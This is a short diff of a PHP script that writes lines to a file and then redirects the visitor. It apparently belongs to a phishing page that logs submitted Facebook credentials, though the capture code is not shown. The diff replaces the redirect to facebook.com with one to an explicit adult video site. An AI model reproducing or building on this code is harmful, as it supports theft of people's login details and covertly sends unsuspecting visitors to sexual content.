@@ -12,7 +12,7 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:https://www.facebook.com/");
+header("location:http://phimsexhd.org/video/NTAzODYzOTk/sex-ny-c%C6%B0%E1%BB%A1i-ng%E1%BB%B1a-%C4%91%E1%BB%89nh-cao.html/");
 exit;
 // https://www.facebook.com/AnuragDhakal11
 ?>
